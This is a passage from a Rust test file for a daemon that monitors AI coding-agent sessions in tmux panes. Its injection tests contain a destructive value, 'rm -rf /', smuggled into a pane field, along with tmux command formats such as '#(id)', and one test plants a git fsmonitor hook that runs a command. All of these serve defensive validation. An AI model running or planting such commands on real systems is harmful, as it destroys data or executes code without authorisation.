    items.iter().map(|item| item.to_string()).collect()
}

// ---- Panes ----

#[test]
fn a_spinner_line_means_working() {
    assert_eq!(pane_state("✻ Spinning… (8m 31s · ↓ 29.7k tokens)\n❯\u{a0}\n"), Some("working"));
}

#[test]
fn the_interrupt_hint_means_working() {
    assert_eq!(pane_state("❯ \n  enter to interrupt and send · ctrl+x then enter to queue\n"), Some("working"));
}

#[test]
fn a_permission_dialog_means_needs_you() {
    assert_eq!(pane_state(" Do you want to proceed?\n ❯ 1. Yes\n   2. No\n"), Some("needs-you"));
}

#[test]
fn a_question_menu_means_needs_you_not_the_idle_prompt() {
    let question = " ☐ Layout\n\n Which guide layout do you want?\n\n ❯ 1. A: one step, one box\n   2. B: checklist + box\n   3. Type something.\n\n Enter to select · ↑/↓ to navigate · Esc to cancel\n";
    assert_eq!(pane_state(question), Some("needs-you"));
}

#[test]
fn a_numbered_line_typed_at_the_prompt_is_not_a_menu() {
    assert_eq!(pane_state("✻ Brewed for 3s\n❯ 1.\n"), Some("waiting"));
}

#[test]
fn the_idle_prompt_with_a_no_break_space_means_waiting() {
    assert_eq!(pane_state("✻ Brewed for 23s · done\n❯\u{a0}\n  [theo@archlinux dotfiles]\n"), Some("waiting"));
}

#[test]
fn phrases_inside_the_conversation_do_not_count() {
    let prose = "- `Do you want to proceed?` on screen: needs-you.\n- esc to interrupt: working.\n❯ \n";
    assert_eq!(pane_state(prose), Some("waiting"));
}

#[test]
fn unrecognised_text_has_no_state() {
    assert_eq!(pane_state("random scrollback\n"), None);
}

#[test]
fn the_permission_request_is_read_from_the_dialog_above_the_question() {
    let boxed = "✻ Thinking…\n╭──────────────────────────╮\n│ Bash command             │\n│                          │\n\
                 │   npm test -- --watch=false │\n│   Run the test suite     │\n│                          │\n\
                 │ Do you want to proceed?  │\n│ ❯ 1. Yes                 │\n│   2. No                  │\n╰──────────╯\n";
    assert_eq!(permission_request(boxed), "Bash command · npm test -- --watch=false");
    assert_eq!(pane_state(boxed), Some("needs-you"));
}

#[test]
fn native_permission_full_request_is_preserved_beyond_the_card_summary() {
    let mut bench = Bench::new();
    let lines: String = (0..35).map(|index| format!("│   command-part-{index}\n")).collect();
    let dialog = format!("unrelated history\n╭─────────────────╮\n│ Bash command\n{lines}│ ENDOFCOMMAND\n│ Do you want to proceed?\n│ ❯ 1. Yes\n╰─────────────────╯\n");
    bench.world.borrow_mut().pane_tails.insert("%5".into(), dialog);
    bench.world.borrow_mut().claude_panes.insert("%5".into());
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Permission needed", "tmux_pane": "%5"}));
    bench.registry.reconcile_with_panes();
    let captured = bench.snapshot().remove(0);
    let complete = captured["full_request"].as_str().expect("complete native dialog missing");
    assert!(complete.contains("command-part-0") && complete.contains("command-part-34"));
    assert!(complete.contains("ENDOFCOMMAND") && !complete.contains("unrelated history"));
    assert!(captured["detail"].as_str().unwrap().chars().count() <= 140);
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["full_request"], captured["full_request"]);
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["full_request"], "");
}

#[test]
fn an_unboxed_dialog_gives_the_two_lines_above_it() {
    assert_eq!(permission_request("done\n Edit file\n src/app.ts\n Do you want to proceed?\n ❯ 1. Yes\n"), "done · Edit file");
}

#[test]
fn no_dialog_means_no_request() {
    assert_eq!(permission_request("❯ \n"), "");
}

#[test]
fn a_request_cannot_carry_a_tmux_format() {
    assert!(!permission_request(" Bash\n echo #{pane}\n Do you want to proceed?\n").contains("#{"));
}

// ---- Reports ----

#[test]
fn continuity_results_survive_new_work_and_daemon_reload() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "needs_input": true, "message": "Which provider?", "turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": "tests passed", "repository": "acme/shop", "branch": "todo-aabbccdd"}));
    let result = bench.snapshot()[0]["last_result"].clone();
    assert_eq!(result["outcome"], "tests passed");
    assert_eq!(result["repository"], "acme/shop");
    bench.report(SESSION_A, json!({"state": "working", "needs_input": false}));
    assert_eq!(bench.snapshot()[0]["last_result"], result);
    assert_eq!(bench.snapshot()[0]["outcome"], "");
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["last_result"], result);
}

#[test]
fn continuity_duplicate_completion_preserves_the_first_result_timestamp() {
    let mut bench = Bench::new();
    let report = json!({"state": "waiting", "turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": "tests passed"});
    bench.report(SESSION_A, report.clone());
    let first = bench.snapshot()[0]["last_result"].clone();
    assert!(first["completed_at"].as_i64().is_some_and(|time| time > 0));
    bench.report(SESSION_A, report);
    assert_eq!(bench.snapshot()[0]["last_result"], first);
    bench.report(SESSION_A, json!({"state": "waiting", "turn_id": "22222222222222222222222222222222", "turn_complete": true, "outcome": "tests passed"}));
    assert_ne!(bench.snapshot()[0]["last_result"]["id"], first["id"]);
}

#[test]
fn continuity_metadata_cannot_change_authenticated_sender_routing() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let report = parse_session(&json!({"session": SESSION_A, "project": "other", "state": "working", "tmux_pane": "%1", "repository": "acme/other", "branch": "main"}).to_string()).unwrap();
    bench.registry.report_from(report, 500).unwrap();
    let row = &bench.snapshot()[0];
    assert_eq!(row["tmux_pane"], "%7");
    assert_eq!(row["repository"], "acme/other");
}

#[test]
fn continuity_old_and_malformed_reports_fail_conservatively() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "tests passed"}));
    assert!(bench.snapshot()[0]["last_result"].is_null());
    for fields in [json!({"turn_id": "bad", "turn_complete": true, "outcome": "ok"}), json!({"turn_complete": true, "outcome": "ok"}), json!({"turn_complete": "yes"}), json!({"repository": "acme/other\n"}), json!({"branch": "#{pane}"}), json!({"turn_id": "11111111111111111111111111111111", "turn_complete": true, "outcome": false})] {
        let mut report = json!({"session": SESSION_A, "project": "p", "state": "waiting"});
        report.as_object_mut().unwrap().extend(fields.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "accepted invalid metadata: {fields}");
    }
}

#[test]
fn continuity_a_session_whose_hook_reports_repositories_is_marked_as_reporting_turns() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], false, "an old hook never sends repository");
    bench.report(SESSION_A, json!({"state": "waiting", "repository": "", "branch": ""}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], true);
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["reports_turns"], true);
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["reports_turns"], true);
}

#[test]
fn continuity_completion_without_an_outcome_does_not_fabricate_a_result() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "turn_id": "11111111111111111111111111111111", "turn_complete": true}));
    assert!(bench.snapshot()[0]["last_result"].is_null());
}

#[test]
fn label_updates_publish_without_changing_activity_or_pending_questions() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "task": "Original user request", "message": "Which option?", "needs_input": true, "sticky": true}));
    let before = bench.snapshot().remove(0);
    let dropped = bench.dropped();
    bench.report(SESSION_A, json!({"label": "Fix session navigation"}));
    let after = bench.snapshot().remove(0);
    assert_eq!(after["label"], "Fix session navigation");
    for key in ["state", "since", "task", "request", "needs_input"] {
        assert_eq!(after[key], before[key], "metadata changed {key}");
    }
    assert_eq!(bench.dropped(), dropped, "label metadata must not dismiss a question banner");
}

#[test]
fn labels_survive_reports_without_labels_and_daemon_restarts() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working", "label": "Free disk space"}));
    bench.report(SESSION_A, json!({"state": "waiting"}));
    assert_eq!(bench.snapshot()[0]["label"], "Free disk space");
    let restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    assert_eq!(restored.snapshot_rows()[0]["label"], "Free disk space");
}

#[test]
fn label_reports_reject_malformed_or_unsafe_names() {
    for label in [json!(false), json!(null), json!(""), json!("Two words"), json!("one two three four five six seven"),
                  json!("a".repeat(57) + " b c"), json!("Free\ndisk space"), json!("Free\u{1b} disk space"), json!("Read #(id) output"), json!("Read #{pane} output")] {
        assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "label": label}).to_string()).is_err(), "accepted {label}");
    }
}

#[test]
fn labels_are_normalized_before_they_are_published() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"label": "  Free   disk space  "}));
    assert_eq!(bench.snapshot()[0]["label"], "Free disk space");
}

#[test]
fn label_reports_cannot_rename_another_panes_session() {
    let mut bench = Bench::new();
    {
        let mut world = bench.world.borrow_mut();
        world.sender_targets.insert(500, target(&[("tmux_pane", "%1")]));
        world.sender_targets.insert(600, target(&[("tmux_pane", "%9")]));
        world.claude_panes = set(&["%1", "%9"]);
    }
    let report = |label| parse_session(&json!({"session": SESSION_A, "project": "p", "label": label}).to_string()).unwrap();
    bench.registry.report_from(report("Fix session navigation"), 500).unwrap();
    assert!(bench.registry.report_from(report("Replace another task"), 600).is_err());
    assert_eq!(bench.snapshot()[0]["label"], "Fix session navigation");
}

#[test]
fn a_full_report_is_accepted() {
    let report = parse_session(&json!({"session": SESSION_A, "state": "working", "project": "p", "tmux_pane": "%4",
                                       "kitty_pid": "42", "kitty_listen": "unix:@kitty-42"}).to_string()).unwrap();
    assert_eq!(report.target["tmux_pane"], "%4");
    assert!(!report.sticky);
}

#[test]
fn the_state_is_optional() {
    let report = parse_session(&json!({"session": SESSION_A, "project": "p", "message": "info"}).to_string()).unwrap();
    assert_eq!(report.state, None);
}

#[test]
fn injections_in_focus_fields_are_refused() {
    for bad in [json!({"tmux_pane": "%2; rm -rf /"}), json!({"kitty_pid": "12\") os.exit"}), json!({"kitty_listen": "unix:@a b"})] {
        let mut report = json!({"session": SESSION_A, "project": "p"});
        report.as_object_mut().unwrap().extend(bad.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "{bad}");
    }
}

#[test]
fn an_opencode_session_id_is_accepted_with_its_agent() {
    let report = parse_session(&json!({"session": OPENCODE_SESSION, "project": "p", "agent": "opencode"}).to_string()).unwrap();
    assert_eq!(report.agent.as_deref(), Some("opencode"));
}

#[test]
fn an_unknown_agent_or_a_malformed_id_is_refused() {
    for bad in [json!({"session": SESSION_A, "agent": "codex"}), json!({"session": SESSION_A, "agent": true}),
                json!({"session": "ses_a b"}), json!({"session": "ses_x"}), json!({"session": "../ses_3f2a9c0b1ffeQkTz"})] {
        let mut report = json!({"project": "p"});
        report.as_object_mut().unwrap().extend(bad.as_object().unwrap().clone());
        assert!(parse_session(&report.to_string()).is_err(), "{bad}");
    }
}

#[test]
fn an_unknown_state_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "state": "bogus", "project": "p"}).to_string()).is_err());
}

#[test]
fn a_missing_project_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "state": "working"}).to_string()).is_err());
}

#[test]
fn tmux_formats_in_text_are_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "task": "#(id)"}).to_string()).is_err());
}

#[test]
fn notices_are_validated_like_session_text() {
    let notice = parse_notice(&json!({"id": "claude-usage-80", "title": "Claude · This week at 82%", "message": "Resets Sat"}).to_string()).unwrap();
    assert_eq!(notice.id, "claude-usage-80");
    let bad = ["nope".to_string(), "[]".to_string(), json!({"id": "A B", "title": "t", "message": "m"}).to_string(),
               json!({"id": "x", "title": "", "message": "m"}).to_string(), json!({"id": "x", "title": "#{pane}", "message": "m"}).to_string()];
    for raw in bad {
        assert!(parse_notice(&raw).is_err(), "{raw}");
    }
}

// ---- Outside the registry ----

#[test]
fn only_a_timed_event_under_way_is_a_meeting() {
    use chrono::{Local, TimeZone};
    let now = Local.with_ymd_and_hms(2026, 10, 19, 10, 30, 0).single().unwrap().timestamp() as f64;
    assert!(events_now("Today, 19/10/2026\n19/10/2026 10:00|19/10/2026 11:00|Standup\n", now));
    assert!(!events_now("19/10/2026|20/10/2026|Holiday\n", now));
    assert!(!events_now("19/10/2026 09:00|19/10/2026 10:30|Done\n", now));
    assert!(events_now("19/10/2026 10:31|19/10/2026 11:00|Starts now\n", now));
}

#[test]
fn gaming_means_game_mode_or_a_game_window() {
    assert!(is_game("gamemode", "kitty"));
    assert!(is_game("default", "steam_app_1245620"));
    assert!(!is_game("default", "zen"));
}

#[test]
fn hyprctl_gets_the_running_hyprland_when_its_id_is_stale() {
    let fixture = Fixture::new();
    let folder = fixture.root.join("run/hypr/running_instance");
    fs::create_dir_all(&folder).unwrap();
    fs::write(folder.join(".socket.sock"), "").unwrap();
    // SAFETY: the fixture holds the environment lock.
    unsafe { std::env::set_var("HYPRLAND_INSTANCE_SIGNATURE", "gone") };
    cockpit::util::refresh_hyprland_instance();
    assert_eq!(std::env::var("HYPRLAND_INSTANCE_SIGNATURE").unwrap(), "running_instance");
}

#[test]
fn a_parallel_clone_is_named_after_its_repository() {
    let _fixture = Fixture::new();
    let clones = cockpit::paths::clones_dir();
    assert_eq!(parallel_clone_repository(&clones.join("opusline/feat-x").to_string_lossy()), "opusline");
    assert_eq!(parallel_clone_repository(&clones.join("opusline/pr-12/apps").to_string_lossy()), "opusline");
    assert_eq!(parallel_clone_repository("/home/theo/IdeaProjects/opusline"), "");
    assert_eq!(parallel_clone_repository(&clones.to_string_lossy()), "");
}

struct ProcessTree(BTreeMap<String, (String, Vec<String>, HashMap<String, String>)>);

impl Processes for ProcessTree {
    fn pids(&self) -> Vec<String> { self.0.keys().cloned().collect() }
    fn comm(&self, pid: &str) -> String { self.0[pid].0.clone() }
    fn command(&self, pid: &str) -> Vec<String> { self.0[pid].1.clone() }
    fn environment(&self, pid: &str) -> HashMap<String, String> { self.0[pid].2.clone() }
    fn pid_namespace(&self, _: &str) -> Option<String> { Some("host".into()) }
}

#[test]
fn floating_chat_ownership_binds_the_conversation_pane_and_tmux_server() {
    for (agent, flag, session) in [("claude", "--session-id", SESSION_A), ("opencode", "--session", OPENCODE_SESSION)] {
        let tree = ProcessTree(BTreeMap::from([("10".into(), (agent.into(),
            vec![agent.into(), flag.into(), session.into()],
            environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0")])))]));
        assert!(session_owns_pane_in(&tree, session, "%4", "123"));
        assert!(!session_owns_pane_in(&tree, SESSION_B, "%4", "123"), "another conversation must not claim the pane");
        assert!(!session_owns_pane_in(&tree, session, "%5", "123"), "another pane must not be accepted");
        assert!(!session_owns_pane_in(&tree, session, "%4", "999"), "an orphan from an old tmux server must not claim a reused pane ID");
    }
}

#[test]
fn floating_chat_ownership_does_not_accept_a_shell_or_overrule_an_explicit_session_id() {
    let mut tree = ProcessTree(BTreeMap::from([("10".into(), ("bash".into(),
        vec!["bash".into()], environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0"), ("CLAUDE_CODE_SESSION_ID", SESSION_A)])))]));
    assert!(!session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    tree.0.get_mut("10").unwrap().0 = "opencode".into();
    assert!(session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    tree.0.get_mut("10").unwrap().1 = vec!["opencode".into(), "--session".into(), OPENCODE_SESSION.into()];
    assert!(!session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
}

#[test]
fn floating_chat_ownership_uses_the_current_id_not_the_conversation_resumed_from() {
    let tree = ProcessTree(BTreeMap::from([("10".into(), ("claude".into(),
        vec!["claude".into(), "--resume".into(), SESSION_B.into(), "--session-id".into(), SESSION_A.into()],
        environment(&[("TMUX_PANE", "%4"), ("TMUX", "/tmp/fixture-tmux,123,0")])))]));
    assert!(session_owns_pane_in(&tree, SESSION_A, "%4", "123"));
    assert!(!session_owns_pane_in(&tree, SESSION_B, "%4", "123"));
}

#[test]
fn the_session_tree_of_claude_2_1_300_is_read_right() {
    // Launcher, daemon (same environment, outlives the launcher), pty host, spare, the session
    // binary, and a shell whose command line mentions an id.
    let pane = |id: &str| HashMap::from([("TMUX_PANE".to_string(), id.to_string())]);
    let words = |parts: &[&str]| parts.iter().map(|part| part.to_string()).collect::<Vec<_>>();
    let mut tree = ProcessTree(BTreeMap::from([
        ("10".into(), ("claude".into(), words(&["/home/t/.local/bin/claude", "--resume", SESSION_B]), pane("%12"))),
        ("11".into(), ("claude".into(), words(&["/home/t/.local/bin/claude", "daemon", "run", "--origin", "transient"]), pane("%12"))),
        ("12".into(), ("2.1.300".into(), words(&["claude bg-pty-host", "--bg-pty-host", "/tmp/x.sock"]), HashMap::new())),
        ("13".into(), ("2.1.300".into(), words(&["claude bg-spare", "--bg-spare", "/tmp/y.sock"]), HashMap::new())),
        ("14".into(), ("2.1.300".into(), words(&["/home/t/.local/share/claude/versions/2.1.300", "--session-id", SESSION_A, "--fork-session"]), HashMap::new())),
        ("15".into(), ("bash".into(), words(&["bash", "-c", &format!("echo --session-id {SESSION_B}")]), pane("%12"))),
    ]));
    assert_eq!(claude_processes(&tree), ["10", "14"]);
    assert_eq!(live_session_ids_in(&tree), set(&[SESSION_A]));
    assert_eq!(claude_panes_in(&tree), set(&["%12"]), "the launcher's pane, not the daemon's");
    tree.0.remove("10");
    assert_eq!(claude_panes_in(&tree), set(&[]));
}

#[test]
fn an_opencode_process_keeps_its_pane_alive() {
    let pane = HashMap::from([("TMUX_PANE".to_string(), "%21".to_string())]);
    let tree = ProcessTree(BTreeMap::from([
        ("30".into(), ("opencode".into(), vec!["/home/t/.opencode/bin/opencode".into()], pane)),
    ]));
    assert_eq!(claude_panes_in(&tree), set(&["%21"]));
}

// ---- The registry ----

#[test]
fn fixture_state_does_not_escape_into_an_inherited_host_state_folder() {
    let outside = std::env::temp_dir().join(format!("osd-host-state-{}", cockpit::util::token_hex(6)));
    fs::create_dir(&outside).unwrap();
    let result = std::process::Command::new(std::env::current_exe().unwrap())
        .args(["--exact", "tests::sessions_are_remembered_across_reboots"])
        .env("CLAUDE_SESSIONS_STATE_HOME", &outside).output().unwrap();
    let leaked = fs::read_dir(&outside).unwrap().next().is_some();
    fs::remove_dir_all(&outside).unwrap();
    assert!(result.status.success(), "{}", String::from_utf8_lossy(&result.stdout));
    assert!(!leaked, "the fixture wrote into the inherited host state folder");
}

#[test]
fn an_explicit_question_survives_idle_and_working_pane_reconciliation() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    for tail in ["❯ \n", "✻ Flowing… (2s)\n"] {
        bench.world.borrow_mut().pane_tails.insert("%5".into(), tail.into());
        bench.registry.reconcile_with_panes();
        assert_eq!(bench.snapshot()[0]["state"], "needs-you");
        assert_eq!(bench.snapshot()[0]["request"], "Which option?");
    }
}

#[test]
fn a_prompt_releases_explicit_question_protection() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.report(SESSION_A, json!({"state": "working", "needs_input": false}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.reconcile_with_panes();
    assert_eq!(bench.snapshot()[0]["state"], "waiting");
    assert_eq!(bench.snapshot()[0]["request"], "");
}

#[test]
fn reports_without_an_input_flag_preserve_question_protection() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.report(SESSION_A, json!({"apps": "figcraft:on"}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    bench.registry.reconcile_with_panes();
    assert_eq!(bench.snapshot()[0]["state"], "needs-you");
}

#[test]
fn after_a_daemon_restart_idle_sessions_can_still_be_picked_for_a_team() {
    // Live smoke test 2026-10-20: after a restart only sessions that reported again were offered.
    let bench = team_bench();
    bench.world.borrow_mut().live_ids.extend([SESSION_A, SESSION_B, OPENCODE_SESSION].map(String::from));
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    let snapshot = crate::teams::host(&mut restored, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    assert_eq!(snapshot["sessions"].as_array().unwrap().len(), 3, "{snapshot}");
}

#[test]
fn a_launch_that_ended_while_the_daemon_was_down_is_not_restored() {
    let bench = team_bench();
    bench.world.borrow_mut().live_ids.extend([SESSION_A, SESSION_B, OPENCODE_SESSION].map(String::from));
    bench.world.borrow_mut().sender_runtimes.remove(&10);
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    let snapshot = crate::teams::host(&mut restored, cockpit::teams::HostRequest::Snapshot).unwrap().result.unwrap();
    let sessions: Vec<_> = snapshot["sessions"].as_array().unwrap().iter().map(|row| row["session_id"].clone()).collect();
    assert!(!sessions.contains(&json!(SESSION_A)), "{sessions:?}");
    assert_eq!(sessions.len(), 2);
}

#[test]
fn a_daemon_restart_preserves_an_explicit_question() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true, "tmux_pane": "%5"}));
    bench.world.borrow_mut().live_ids.insert(SESSION_A.into());
    let mut restored = Registry::new(Box::new(FakeSystem(bench.world.clone())), Box::new(FakeBanners(bench.shown.clone())));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "❯ \n".into());
    restored.reconcile_with_panes();
    assert_eq!(restored.snapshot_rows()[0]["state"], "needs-you");
    assert_eq!(restored.snapshot_rows()[0]["request"], "Which option?");
}

#[test]
fn an_explicit_question_replaces_stale_permission_detail() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Permission?", "tmux_pane": "%5"}));
    bench.world.borrow_mut().pane_tails.insert("%5".into(), " Bash command\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n".into());
    bench.registry.reconcile_with_panes();
    assert_eq!(bench.snapshot()[0]["detail"], "Bash command · npm test");
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?", "needs_input": true}));
    assert_eq!(bench.snapshot()[0]["detail"], "");
    assert_eq!(bench.snapshot()[0]["request"], "Which option?");
}

#[test]
fn an_input_flag_change_is_published_even_when_the_question_did_not_change() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Which option?"}));
    bench.report(SESSION_A, json!({"needs_input": true}));
    assert_eq!(bench.snapshot()[0]["needs_input"], true);
}

#[test]
fn an_input_flag_must_be_boolean() {
    for flag in [json!("true"), json!(1), Value::Null] {
        let result = parse_session(&json!({"session": SESSION_A, "project": "p", "needs_input": flag}).to_string());
        assert!(result.is_err(), "{result:?}");
    }
}

#[test]
fn an_acknowledged_session_report_updates_its_authenticated_card() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", "%7")]));
    let payload = json!({"session": SESSION_A, "project": "p", "state": "needs-you", "message": "Which option?", "needs_input": true});
    assert!(bench.registry.request_from("session-request", &payload.to_string(), 500).is_ok());
    assert_eq!(bench.snapshot()[0]["request"], "Which option?");
    assert_eq!(bench.snapshot()[0]["tmux_pane"], "%7");
}

#[test]
fn an_acknowledged_session_report_is_refused_without_a_trusted_sender() {
    let mut bench = Bench::new();
    let payload = json!({"session": SESSION_A, "project": "p", "state": "needs-you", "message": "Which option?", "needs_input": true});
    assert!(bench.registry.request_from("session-request", &payload.to_string(), 777).is_err());
    assert!(bench.registry.sessions.is_empty());
}

#[test]
fn command_chat_ownership_comes_from_the_authenticated_pane_not_the_claim() {
    for (pane, expected) in [("%7", json!(SESSION_A)), ("%8", Value::Null)] {
        let mut bench = Bench::new();
        bench.report(SESSION_A, json!({"state": "waiting", "tmux_pane": "%7"}));
        bench.world.borrow_mut().sender_targets.insert(500, target(&[("tmux_pane", pane)]));
        let folder = bench.fixture.root.join("project");
        fs::create_dir_all(&folder).unwrap();
        let key = answers_key_of(&folder);
        bench.world.borrow_mut().sender_directories.insert(500, folder.display().to_string());
        let raw = json!({"id": "1123456789ab", "session": SESSION_A, "verified_session": SESSION_A,
            "command": "true", "answers": key}).to_string();
        bench.registry.request_from("run-request", &raw, 500).unwrap();
        let held = cockpit::util::read_json(&cockpit::approval::held_request("1123456789ab", "request")).unwrap();
        assert_eq!(held["verified_session"], expected, "pane {pane}");
    }
}

#[test]
fn the_daemon_writes_its_messages_to_the_shared_log() {
    let fixture = Fixture::new();
    log("session aaaaaaaa (runway) is gone, dropping it");
    let text = fs::read_to_string(fixture.root.join("state/claude-sessions/log")).unwrap();
    let line = text.lines().last().unwrap();
    assert!(regex::Regex::new(r"[+-]\d\d:\d\d INFO daemon: session aaaaaaaa \(runway\) is gone, dropping it$").unwrap().is_match(line), "{line}");
}

#[test]
fn a_waiting_session_carries_what_it_asks_until_it_moves_on() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    assert_eq!(bench.snapshot()[0]["request"], "Claude needs your permission to use Bash");
    {
        let mut world = bench.world.borrow_mut();
        world.claude_panes = set(&["%5"]);
        world.pane_tails.insert("%5".into(), " Bash command\n   npm test\n Do you want to proceed?\n ❯ 1. Yes\n".into());
    }
    bench.report(SESSION_A, json!({"tmux_pane": "%5"}));
    bench.registry.prune_dead();
    assert_eq!(bench.snapshot()[0]["detail"], "Bash command · npm test");
    bench.world.borrow_mut().pane_tails.insert("%5".into(), "✻ Flowing… (2s)\n".into());
    bench.report(SESSION_A, json!({"state": "working"}));
    let row = &bench.snapshot()[0];
    assert_eq!((row["request"].as_str(), row["detail"].as_str()), (Some(""), Some("")));
}

#[test]
fn banners_wait_for_the_end_of_a_meeting() {
    let mut bench = Bench::new();
    bench.world.borrow_mut().in_meeting = true;
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    assert!(bench.raised().is_empty());
    bench.world.borrow_mut().in_meeting = false;
    bench.registry.prune_dead();
    assert_eq!(bench.raised(), [SESSION_A]);
}

#[test]
fn sessions_are_remembered_across_reboots() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": "/r/runway", "project": "runway"}));
    bench.report(SESSION_A, json!({"state": "gone"}));
    let recent = cockpit::util::read_json(&cockpit::paths::recent_sessions()).unwrap();
    assert_eq!((recent[SESSION_A]["project"].as_str(), recent[SESSION_A]["cwd"].as_str()), (Some("runway"), Some("/r/runway")));
}

#[test]
fn a_finished_turn_shows_what_the_hook_found_it_did() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "working"}));
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "1 commit · 1 file changed, +2 −0 uncommitted"}));
    assert_eq!(bench.snapshot()[0]["outcome"], "1 commit · 1 file changed, +2 −0 uncommitted");
}

#[test]
fn a_new_turn_forgets_the_last_outcome() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you", "outcome": "no changes"}));
    bench.report(SESSION_A, json!({"state": "working"}));
    assert_eq!(bench.snapshot()[0]["outcome"], "");
}

#[test]
fn an_outcome_with_a_tmux_format_is_refused() {
    assert!(parse_session(&json!({"session": SESSION_A, "project": "p", "outcome": "#(id)"}).to_string()).is_err());
}

#[test]
fn the_daemon_never_runs_git_on_a_session_folder() {
    // A session can write its repository's configuration (core.fsmonitor, filters): git run out
    // here on its folder would run that as Theo. The project is read from the .git files instead.
    let mut bench = Bench::new();
    let repository = bench.fixture.root.join("evil");
    fs::create_dir_all(repository.join(".git")).unwrap();
    let ran = bench.fixture.root.join("ran");
    fs::write(repository.join(".git/config"), format!("[core]\n\tfsmonitor = touch {}\n", ran.display())).unwrap();
    let cwd = repository.to_string_lossy().into_owned();
    bench.report(SESSION_A, json!({"state": "working", "cwd": cwd}));
    bench.report(SESSION_A, json!({"state": "waiting", "message": "Finished, waiting for you"}));
    assert!(!ran.exists());
    assert_eq!(bench.snapshot()[0]["project"], "evil");
}

#[test]
fn a_banner_left_up_while_the_session_works_is_removed() {
    let mut bench = Bench::new();
    bench.report(SESSION_A, json!({"state": "needs-you", "message": "Claude needs your permission to use Bash", "sticky": true}));
    // The report that should have removed it was missed.
    bench.registry.sessions.get_mut(SESSION_A).unwrap().state = "working".into();
    bench.registry.prune_dead();
    assert!(bench.dropped().contains(&SESSION_A.to_string()));
}

/// A checkout at `path` (a .git folder), as git leaves it, without running git.
fn checkout(path: &Path) {
    fs::create_dir_all(path.join(".git")).unwrap();
}

#[test]
fn the_project_is_the_starting_directorys_and_stays() {
    let mut bench = Bench::new();
    let main = bench.fixture.root.join("r/opusline");
    checkout(&main);
    fs::create_dir_all(main.join("apps/api")).unwrap();
    bench.report(SESSION_A, json!({"state": "waiting", "cwd": main.join("apps/api").to_string_lossy(), "project": "api"}));
    bench.report(SESSION_A, json!({"state": "working", "cwd": main.to_string_lossy(), "project": "opusline"}));
    let row = &bench.snapshot()[0];
    assert_eq!((row["project"].as_str(), row["cwd"].as_str()), (Some("opusline"), Some(main.join("apps/api").to_string_lossy().as_ref())));
    assert!(row.get("started").is_some());
